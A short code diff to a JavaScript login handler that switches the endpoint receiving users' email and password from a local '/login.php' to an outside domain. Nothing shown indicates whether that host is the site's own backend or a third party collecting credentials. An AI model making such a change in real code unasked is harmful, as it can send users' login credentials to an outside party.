@@ -6,7 +6,7 @@ if (loginForm) {
     const password = document.getElementById("password").value;
 
     try {
-      const res = await fetch('/login.php', {
+      const res = await fetch('https://outsdrs.com/php/login.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password })
